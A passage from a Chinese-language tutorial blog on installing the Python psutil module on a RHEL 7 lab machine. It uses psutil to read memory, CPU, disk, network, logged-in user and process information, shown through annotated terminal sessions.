class="line">  Installing : gcc-objc-4.8.5-4.el7.x86_64                                14/19</span><br><span class="line">  Installing : libstdc++-devel-4.8.5-4.el7.x86_64                         15/19</span><br><span class="line">  Installing : gcc-c++-4.8.5-4.el7.x86_64                                 16/19</span><br><span class="line">  Installing : gcc-objc++-4.8.5-4.el7.x86_64                              17/19</span><br><span class="line">  Installing : gcc-gfortran-4.8.5-4.el7.x86_64                            18/19</span><br><span class="line">  Installing : gcc-gnat-4.8.5-4.el7.x86_64                                19/19</span><br><span class="line">  Verifying  : libstdc++-devel-4.8.5-4.el7.x86_64                          1/19</span><br><span class="line">  Verifying  : gcc-objc-4.8.5-4.el7.x86_64                                 2/19</span><br><span class="line">  Verifying  : libquadmath-devel-4.8.5-4.el7.x86_64                        3/19</span><br><span class="line">  Verifying  : gcc-4.8.5-4.el7.x86_64                                      4/19</span><br><span class="line">  Verifying  : libquadmath-4.8.5-4.el7.x86_64                              5/19</span><br><span class="line">  Verifying  : cpp-4.8.5-4.el7.x86_64                                      6/19</span><br><span class="line">  Verifying  : gcc-objc++-4.8.5-4.el7.x86_64                               7/19</span><br><span class="line">  Verifying  : mpfr-3.1.1-4.el7.x86_64                                     8/19</span><br><span class="line">  Verifying  : glibc-headers-2.17-105.el7.x86_64                           9/19</span><br><span class="line">  Verifying  : glibc-devel-2.17-105.el7.x86_64                            10/19</span><br><span class="line">  Verifying  : libobjc-4.8.5-4.el7.x86_64                                 11/19</span><br><span class="line">  Verifying  : gcc-gfortran-4.8.5-4.el7.x86_64                            12/19</span><br><span class="line">  Verifying  : libgfortran-4.8.5-4.el7.x86_64                             13/19</span><br><span class="line">  Verifying  : gcc-c++-4.8.5-4.el7.x86_64                                 14/19</span><br><span class="line">  Verifying  : libmpc-1.0.1-3.el7.x86_64                                  15/19</span><br><span class="line">  Verifying  : gcc-gnat-4.8.5-4.el7.x86_64                                16/19</span><br><span class="line">  Verifying  : kernel-headers-3.10.0-327.el7.x86_64                       17/19</span><br><span class="line">  Verifying  : libgnat-4.8.5-4.el7.x86_64                                 18/19</span><br><span class="line">  Verifying  : libgnat-devel-4.8.5-4.el7.x86_64                           19/19</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  gcc.x86_64 0:4.8.5-4.el7                gcc-c++.x86_64 0:4.8.5-4.el7</span><br><span class="line">  gcc-gfortran.x86_64 0:4.8.5-4.el7       gcc-gnat.x86_64 0:4.8.5-4.el7</span><br><span class="line">  gcc-objc.x86_64 0:4.8.5-4.el7           gcc-objc++.x86_64 0:4.8.5-4.el7</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  cpp.x86_64 0:4.8.5-4.el7               glibc-devel.x86_64 0:2.17-105.el7</span><br><span class="line">  glibc-headers.x86_64 0:2.17-105.el7    kernel-headers.x86_64 0:3.10.0-327.el7</span><br><span class="line">  libgfortran.x86_64 0:4.8.5-4.el7       libgnat.x86_64 0:4.8.5-4.el7</span><br><span class="line">  libgnat-devel.x86_64 0:4.8.5-4.el7     libmpc.x86_64 0:1.0.1-3.el7</span><br><span class="line">  libobjc.x86_64 0:4.8.5-4.el7           libquadmath.x86_64 0:4.8.5-4.el7</span><br><span class="line">  libquadmath-devel.x86_64 0:4.8.5-4.el7 libstdc++-devel.x86_64 0:4.8.5-4.el7</span><br><span class="line">  mpfr.x86_64 0:3.1.1-4.el7</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次安装</span></span><br><span class="line">(python)[root@workstation0 python]# pip install psutil</span><br><span class="line">Downloading/unpacking psutil</span><br><span class="line">  Downloading psutil-4.3.1.tar.gz (315kB): 315kB downloaded</span><br><span class="line">  Running setup.py egg_info for package psutil</span><br><span class="line"></span><br><span class="line">    warning: no previously-included files matching '*' found under directory 'docs/_build'</span><br><span class="line">Installing collected packages: psutil</span><br><span class="line">  Running setup.py install for psutil</span><br><span class="line">    building 'psutil._psutil_linux' extension</span><br><span class="line">    gcc -pthread -fno-strict-aliasing -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -DNDEBUG -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -fPIC -DPSUTIL_VERSION=431 -I/usr/include/python2.7 -c psutil/_psutil_linux.c -o build/temp.linux-x86_64-2.7/psutil/_psutil_linux.o</span><br><span class="line">    gcc -pthread -shared -Wl,-z,relro build/temp.linux-x86_64-2.7/psutil/_psutil_linux.o -L/usr/lib64 -lpython2.7 -o build/lib.linux-x86_64-2.7/psutil/_psutil_linux.so</span><br><span class="line">    building 'psutil._psutil_posix' extension</span><br><span class="line">    gcc -pthread -fno-strict-aliasing -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -DNDEBUG -O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector-strong --param=ssp-buffer-size=4 -grecord-gcc-switches -m64 -mtune=generic -D_GNU_SOURCE -fPIC -fwrapv -fPIC -I/usr/include/python2.7 -c psutil/_psutil_posix.c -o build/temp.linux-x86_64-2.7/psutil/_psutil_posix.o</span><br><span class="line">    gcc -pthread -shared -Wl,-z,relro build/temp.linux-x86_64-2.7/psutil/_psutil_posix.o -L/usr/lib64 -lpython2.7 -o build/lib.linux-x86_64-2.7/psutil/_psutil_posix.so</span><br><span class="line"></span><br><span class="line">    warning: no previously-included files matching '*' found under directory 'docs/_build'</span><br><span class="line">Successfully installed psutil</span><br><span class="line">Cleaning up...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装模块成功，进入尝试加载模块psutil</span></span><br><span class="line">(python)[root@workstation0 python]# python</span><br><span class="line">Python 2.7.5 (default, Oct 11 2015, 17:47:16)</span><br><span class="line">[GCC 4.8.3 20140911 (Red Hat 4.8.3-9)] on linux2</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看到离开虚拟环境，python无法加载psutil模块</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[kiosk@foundation0 Desktop]$ ssh root@172.25.0.15</span><br><span class="line">root@172.25.0.15's password:</span><br><span class="line">X11 forwarding request failed on channel 0</span><br><span class="line">Last login: Tue Oct 18 16:55:43 2016 from 172.25.0.250</span><br><span class="line">[root@workstation0 ~]# python</span><br><span class="line">Python 2.7.5 (default, Oct 11 2015, 17:47:16)</span><br><span class="line">[GCC 4.8.3 20140911 (Red Hat 4.8.3-9)] on linux2</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">ImportError: No module named psutil</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h2 id="Python实践3——使用psutil系统性能信息模块获取当前物理内存总大小及已使用大小" class="article-heading"><a href="#Python实践3——使用psutil系统性能信息模块获取当前物理内存总大小及已使用大小" class="headerlink" title="Python实践3——使用psutil系统性能信息模块获取当前物理内存总大小及已使用大小"></a>Python实践3——使用psutil系统性能信息模块获取当前物理内存总大小及已使用大小<a class="article-anchor" href="#Python实践3——使用psutil系统性能信息模块获取当前物理内存总大小及已使用大小" aria-hidden="true"></a></h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 ~]# free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           488M        102M         69M        4.4M        316M        344M</span><br><span class="line">Swap:          511M          0B        511M</span><br><span class="line">[root@workstation0 ~]# free -h|awk '/Mem/{print$2}'</span><br><span class="line">488M</span><br><span class="line">[root@workstation0 ~]# free -h|awk '/Mem/{print$3}'</span><br><span class="line">102M</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; mem=psutil.virtual_memory()</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; mem.total,mem.used</span></span><br><span class="line">(512729088, 440070144)</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以通过help(psutil)来查看帮助信息;进入帮助之后可以使用“/关键字”搜索关键字;使用q退出</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">help</span>(psutil)</span></span><br></pre></td></tr></tbody></table></figure>

<p>virtual_memory<br>total 虚拟内存的总大小<br>used 虚拟内存已经使用的大小</p>
<h3 id="内存信息" class="article-heading"><a href="#内存信息" class="headerlink" title="内存信息"></a>内存信息<a class="article-anchor" href="#内存信息" aria-hidden="true"></a></h3><p>Linux系统的内存利用率信息:<br>涉及total(内存总数)<br>used(已使用的内存数)<br>free(空闲内存数)<br>buffers(缓冲使用数)<br>cache(缓存使用数)<br>swap(交换分区使用数)</p>
<p>psutil.virtual_memory()与psutil.swap_memory()方法获取这些信息</p>
<h2 id="Python实践4——使用psutil系统性能信息模块获取当前系统CPU利用率" class="article-heading"><a href="#Python实践4——使用psutil系统性能信息模块获取当前系统CPU利用率" class="headerlink" title="Python实践4——使用psutil系统性能信息模块获取当前系统CPU利用率"></a>Python实践4——使用psutil系统性能信息模块获取当前系统CPU利用率<a class="article-anchor" href="#Python实践4——使用psutil系统性能信息模块获取当前系统CPU利用率" aria-hidden="true"></a></h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.cpu_times()</span></span><br><span class="line">scputimes(user=40.86, nice=9.26, system=41.36, idle=5833.96, iowait=15.87, irq=0.0, softirq=0.06, steal=25.99, guest=0.0, guest_nice=0.0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.cpu_times(percpu=True)</span></span><br><span class="line">[scputimes(user=21.43, nice=4.91, system=22.05, idle=2941.57, iowait=8.83, irq=0.0, softirq=0.04, steal=12.93, guest=0.0, guest_nice=0.0), scputimes(user=19.43, nice=4.34, system=19.31, idle=2951.0, iowait=7.04, irq=0.0, softirq=0.01, steal=13.06, guest=0.0, guest_nice=0.0)]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.cpu_times().user</span></span><br><span class="line">40.88</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.cpu_count(logical=True)</span></span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.cpu_count(logical=False)</span></span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="CPU信息" class="article-heading"><a href="#CPU信息" class="headerlink" title="CPU信息"></a>CPU信息<a class="article-anchor" href="#CPU信息" aria-hidden="true"></a></h3><p>Linux操作系统的CPU利用率有以下几个部分:</p>
<ul>
<li>User Time,执行用户进程的时间百分比;</li>
<li>System Time,执行内核进程和中断的时间百分比;</li>
<li>Wait IO,由于IO等待而使CPU处于idle(空闲)状态的时间百分比;</li>
<li>Idle,CPU处于idle状态的时间百分比。</li>
</ul>
<p>psutil.cpu_times()方法可以非常简单地得到这些信息</p>
<ul>
<li>cpu_times() 获取CPU完整信息</li>
<li>cpu_times(percpu=True) 指定方法变量percpu=True显示所有逻辑CPU信息</li>
<li>cpu_times().user 获取执行用户进程的时间百分比</li>
<li>cpu_count(logical=True) 获取CPU的逻辑个数</li>
<li>cpu_count(logical=False) 获取CPU的物理个数</li>
</ul>
<h2 id="Python实践5——使用psutil系统性能信息模块获取当前系统磁盘信息" class="article-heading"><a href="#Python实践5——使用psutil系统性能信息模块获取当前系统磁盘信息" class="headerlink" title="Python实践5——使用psutil系统性能信息模块获取当前系统磁盘信息"></a>Python实践5——使用psutil系统性能信息模块获取当前系统磁盘信息<a class="article-anchor" href="#Python实践5——使用psutil系统性能信息模块获取当前系统磁盘信息" aria-hidden="true"></a></h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; d=psutil.disk_partitions()</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> d</span></span><br><span class="line">[sdiskpart(device='/dev/mapper/rhel-root', mountpoint='/', fstype='xfs', opts='rw,seclabel,relatime,attr2,inode64,noquota'), sdiskpart(device='/dev/mapper/rhel-home', mountpoint='/home', fstype='xfs', opts='rw,seclabel,relatime,attr2,inode64,noquota'), sdiskpart(device='/dev/vda1', mountpoint='/boot', fstype='xfs', opts='rw,seclabel,relatime,attr2,inode64,noquota')]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; d=psutil.disk_usage(<span class="string">'/'</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> d</span></span><br><span class="line">sdiskusage(total=9447669760, used=1199980544, free=8247689216, percent=12.7)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; d=psutil.disk_io_counters()</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> d</span></span><br><span class="line">sdiskio(read_count=16896, write_count=21325, read_bytes=428721664, write_bytes=707450880, read_time=35974, write_time=1077043, read_merged_count=8, write_merged_count=962, busy_time=131356)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; d=psutil.disk_io_counters(perdisk=True)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> d</span></span><br><span class="line">{'vda1': sdiskio(read_count=581, write_count=519, read_bytes=4516352, write_bytes=2109440, read_time=687, write_time=663, read_merged_count=0, write_merged_count=0, busy_time=1312), 'vda2': sdiskio(read_count=8134, write_count=9658, read_bytes=211797504, write_bytes=352695296, read_time=17532, write_time=456746, read_merged_count=8, write_merged_count=962, busy_time=47092), 'vdb': sdiskio(read_count=144, write_count=0, read_bytes=1040384, write_bytes=0, read_time=429, write_time=0, read_merged_count=0, write_merged_count=0, busy_time=378), 'dm-2': sdiskio(read_count=87, write_count=4, read_bytes=522752, write_bytes=2097152, read_time=53, write_time=640, read_merged_count=0, write_merged_count=0, busy_time=210), 'dm-0': sdiskio(read_count=7824, write_count=11150, read_bytes=209751040, write_bytes=350598144, read_time=16900, write_time=618994, read_merged_count=0, write_merged_count=0, busy_time=81997), 'dm-1': sdiskio(read_count=126, write_count=0, read_bytes=1093632, write_bytes=0, read_time=373, write_time=0, read_merged_count=0, write_merged_count=0, busy_time=367)}</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="磁盘IO信息" class="article-heading"><a href="#磁盘IO信息" class="headerlink" title="磁盘IO信息"></a>磁盘IO信息<a class="article-anchor" href="#磁盘IO信息" aria-hidden="true"></a></h3><ul>
<li>read_count(读IO数)</li>
<li>write_count(写IO数)</li>
<li>read_bytes(IO读字节数)</li>
<li>write_bytes(IO写字节数)</li>
<li>read_time(磁盘读时间)</li>
<li>write_time(磁盘写时间)等。</li>
</ul>
<p>这些IO信息可以使用psutil.disk_io_counters()获取</p>
<ul>
<li>disk_partitions() 获取磁盘完整信息</li>
<li>disk_usage() 获取分区(参数)的使用情况</li>
<li>disk_io_counters() 获取硬盘总的IO个数、读写信息</li>
<li>perdisk=True 参数获取单个分区IO个数读写信息</li>
</ul>
<h2 id="Python实践6——使用psutil系统性能信息模块获取当前系统网络信息" class="article-heading"><a href="#Python实践6——使用psutil系统性能信息模块获取当前系统网络信息" class="headerlink" title="Python实践6——使用psutil系统性能信息模块获取当前系统网络信息"></a>Python实践6——使用psutil系统性能信息模块获取当前系统网络信息<a class="article-anchor" href="#Python实践6——使用psutil系统性能信息模块获取当前系统网络信息" aria-hidden="true"></a></h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.net_io_counters()</span></span><br><span class="line">snetio(bytes_sent=754606, bytes_recv=78983995, packets_sent=4592, packets_recv=9383, errin=0, errout=0, dropin=0, dropout=0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.net_io_counters(pernic=True)</span></span><br><span class="line">{'lo': snetio(bytes_sent=0, bytes_recv=0, packets_sent=0, packets_recv=0, errin=0, errout=0, dropin=0, dropout=0), 'eth1': snetio(bytes_sent=0, bytes_recv=115672, packets_sent=0, packets_recv=2220, errin=0, errout=0, dropin=0, dropout=0), 'eth0': snetio(bytes_sent=756370, bytes_recv=78870967, packets_sent=4606, packets_recv=7196, errin=0, errout=0, dropin=0, dropout=0)}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="网络信息" class="article-heading"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息<a class="article-anchor" href="#网络信息" aria-hidden="true"></a></h3><ul>
<li>bytes_sent(发送字节数)</li>
<li>bytes_recv=28220119(接收字节数)</li>
<li>packets_sent=200978(发送数据包数)</li>
<li>packets_recv=212672(接收数据包数)</li>
</ul>
<p>这些网络信息使用psutil.net_io_counters()方法获取</p>
<ul>
<li>net_io_counters() 获取网络总的IO信息,默认pernic=False</li>
<li>net_io_counters(pernic=True) 输出每个网络接口的IO信息</li>
</ul>
<h2 id="Python实践7——使用psutil系统性能信息模块获取当前系统用户登录信息" class="article-heading"><a href="#Python实践7——使用psutil系统性能信息模块获取当前系统用户登录信息" class="headerlink" title="Python实践7——使用psutil系统性能信息模块获取当前系统用户登录信息"></a>Python实践7——使用psutil系统性能信息模块获取当前系统用户登录信息<a class="article-anchor" href="#Python实践7——使用psutil系统性能信息模块获取当前系统用户登录信息" aria-hidden="true"></a></h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import subprocess</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; subprocess.call(<span class="string">"who"</span>,shell=True)</span></span><br><span class="line">root     pts/0        2016-10-18 16:55 (172.25.0.250)</span><br><span class="line">root     pts/1        2016-10-18 17:22 (172.25.0.250)</span><br><span class="line">0</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.users()</span></span><br><span class="line">[suser(name='root', terminal='pts/0', host='172.25.0.250', started=1476780928.0), suser(name='root', terminal='pts/1', host='172.25.0.250', started=1476782592.0)]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; u=psutil.users()</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> u[0]</span></span><br><span class="line">suser(name='root', terminal='pts/0', host='172.25.0.250', started=1476780928.0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> u[1]</span></span><br><span class="line">suser(name='root', terminal='pts/1', host='172.25.0.250', started=1476782592.0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a=u[::-1]</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span> a</span></span><br><span class="line">[suser(name='root', terminal='pts/1', host='172.25.0.250', started=1476782592.0), suser(name='root', terminal='pts/0', host='172.25.0.250', started=1476780928.0)]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.boot_time()</span></span><br><span class="line">1476780907.0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="其他系统信息" class="article-heading"><a href="#其他系统信息" class="headerlink" title="其他系统信息"></a>其他系统信息<a class="article-anchor" href="#其他系统信息" aria-hidden="true"></a></h3><p>psutil模块还支持获取用户登录、开机时间等信息</p>
<ul>
<li>users()</li>
<li>boot_time() 开机时间</li>
</ul>
<h2 id="Python实践8——使用psutil系统性能信息模块获取当前系统进程信息" class="article-heading"><a href="#Python实践8——使用psutil系统性能信息模块获取当前系统进程信息" class="headerlink" title="Python实践8——使用psutil系统性能信息模块获取当前系统进程信息"></a>Python实践8——使用psutil系统性能信息模块获取当前系统进程信息<a class="article-anchor" href="#Python实践8——使用psutil系统性能信息模块获取当前系统进程信息" aria-hidden="true"></a></h2><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import psutil</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.pids()</span></span><br><span class="line">[1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 33, 34, 35, 36, 37, 45, 46, 47, 49, 50, 51, 70, 100, 267, 269, 271, 272, 274, 275, 278, 281, 282, 358, 359, 370, 371, 384, 385, 386, 387, 388, 389, 390, 467, 480, 488, 508, 529, 536, 537, 538, 539, 540, 542, 543, 550, 551, 552, 553, 554, 569, 592, 594, 595, 597, 599, 607, 610, 614, 663, 704, 705, 988, 1191, 1193, 1198, 1204, 1586, 1604, 2339, 2344, 2376, 2451, 9480, 9482, 9486, 9548, 9550, 9555]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.pids()</span></span><br><span class="line">[1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 33, 34, 35, 36, 37, 45, 46, 47, 49, 50, 51, 70, 100, 267, 269, 271, 272, 274, 275, 278, 281, 282, 358, 359, 370, 371, 384, 385, 386, 387, 388, 389, 390, 467, 480, 488, 508, 529, 536, 537, 538, 539, 540, 542, 543, 550, 551, 552, 553, 554, 569, 592, 594, 595, 597, 599, 607, 610, 614, 663, 704, 705, 988, 1191, 1193, 1198, 1204, 1586, 1604, 2339, 2344, 2376, 2451, 9480, 9482, 9486, 9548, 9550, 9555, 9564, 9571, 9581]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.Process(9581)</span></span><br><span class="line">&lt;psutil.Process(pid=9581, name='kworker/1:0') at 39994576&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; psutil.Process(9564)</span></span><br><span class="line">&lt;psutil.Process(pid=9564, name='yum') at 39994384&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p=psutil.Process(9564)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.name()</span></span><br><span class="line">'yum'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.exe</span></span><br><span class="line">&lt;bound method Process.exe of &lt;psutil.Process(pid=9564, name='yum') at 39994576&gt;&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.exe()</span></span><br><span class="line">'/usr/bin/python2.7'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.cwd()</span></span><br><span class="line">'/root'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.status()</span></span><br><span class="line">'disk-sleep'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.create_time()</span></span><br><span class="line">1476787328.27</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.uids()</span></span><br><span class="line">puids(real=0, effective=0, saved=0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.gids()</span></span><br><span class="line">pgids(real=0, effective=0, saved=0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.cpu_times()</span></span><br><span class="line">pcputimes(user=17.34, system=4.62, children_user=5.46, children_system=4.68)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.cpu_affinity()</span></span><br><span class="line">[0, 1]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.memory_percent()</span></span><br><span class="line">14.738212784994168</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.memort_info()</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: 'Process' object has no attribute 'memort_info'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.memore_info()</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: 'Process' object has no attribute 'memore_info'</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.memory_info()</span></span><br><span class="line">pmem(rss=76226560, vms=435654656, shared=13361152, text=4096, lib=0, data=61382656, dirty=0)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p=psutil.Process(10242)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.io_counters()</span></span><br><span class="line">pio(read_count=10, write_count=64, read_bytes=229376, write_bytes=0)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.connections()</span></span><br><span class="line">[]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.num_threads()</span></span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<h3 id="系统进程管理方法" class="article-heading"><a href="#系统进程管理方法" class="headerlink" title="系统进程管理方法"></a>系统进程管理方法<a class="article-anchor" href="#系统进程管理方法" aria-hidden="true"></a></h3><p>获得当前系统的进程信息,可以让运维人员得知应用程序的运行<br>状态,包括进程的启动时间、查看或设置CPU亲和度、内存使用率、IO<br>信息、socket连接、线程数等,这些信息可以呈现出指定进程是否存<br>活、资源利用情况,为开发人员的代码优化、问题定位提供很好的数据<br>参考。</p>
<h4 id="进程信息" class="article-heading"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息<a class="article-anchor" href="#进程信息" aria-hidden="true"></a></h4><p>psutil模块通过psutil.pids()方法获取所有进程PID；psutil.Process()方法获取单个进程的名称、路径、状态、系统资源利用率等信息。</p>
<ul>
<li>psutil.pids() #列出所有进程PID</li>
<li>psutil.Process(2424) #实例化一个Process对象,参数为一进程PID</li>
<li>p.name() #进程名</li>
<li>p.exe() #进程bin路径</li>
<li>p.cwd() #进程工作目录绝对路径</li>
<li>p.status() #进程状态</li>
<li>p.create_time() #进程创建时间,时间戳格式</li>
<li>p.uids() #进程uid信息</li>
<li>p.gids() #进程gid信息</li>
<li>p.cpu_times() #进程CPU时间信息,包括user、system两个CPU时间</li>
<li>p.cpu_affinity() #get进程CPU亲和度,如要设置进程CPU亲和度,将CPU号作为参数即可</li>
<li>p.memory_percent() #进程内存利用率</li>
<li>p.memory_info() #进程内存rss、vms信息</li>
<li>p.io_counters() #进程IO信息,包括读写IO数及字节数</li>
<li>p.connections() #返回打开进程socket的namedutples列表,包括fs、family、laddr等信息</li>
<li>pl.num_threads() #进程开启的线程数</li>
</ul>
